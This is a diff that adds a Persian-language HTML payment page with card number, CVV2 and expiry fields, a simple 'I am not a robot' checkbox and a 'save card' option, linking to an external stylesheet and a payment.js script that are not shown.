@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html lang="fa" dir="rtl">
+<head>
+     <meta name="viewport" content="width=device-width,initial-scale=1.0">
+    <meta charset="UTF-8">
+    <title>پرداخت امن</title>
+    <link rel="stylesheet" href="styl.css">
+</head>
+<body>
+
+<div class="payment-box">
+    <h2>🔐 پرداخت امن</h2>
+
+    <form id="paymentForm" class="checkout-form">
+
+        <input type="text" id="cardNumber" placeholder="شماره کارت (16 رقم)" required>
+
+        <input type="text" id="cvv2" placeholder="CVV2 (3 یا 4 رقم)" required>
+
+        <div class="row">
+            <input type="text" id="expMonth" placeholder="ماه (MM)" required>
+            <input type="text" id="expYear" placeholder="سال (YY)" required>
+        </div>
+
+        <label class="captcha-box">
+            <input type="checkbox" id="captcha">
+            <span>من روبات نیستم</span>
+        </label>
+
+        <label class="captcha-box">
+            <input type="checkbox" id="saveCard">
+            <span>ذخیره شماره کارت</span>
+        </label>
+
+        <button type="submit" class="checkout-btn">
+            پرداخت امن و نهایی
+        </button>
+
+        <p class="secure-note">
+            🔒 اطلاعات شما به صورت امن پردازش می‌شود
+        </p>
+
+    </form>
+</div>
+
+<script src="payment.js"></script>
+</body>
+</html>
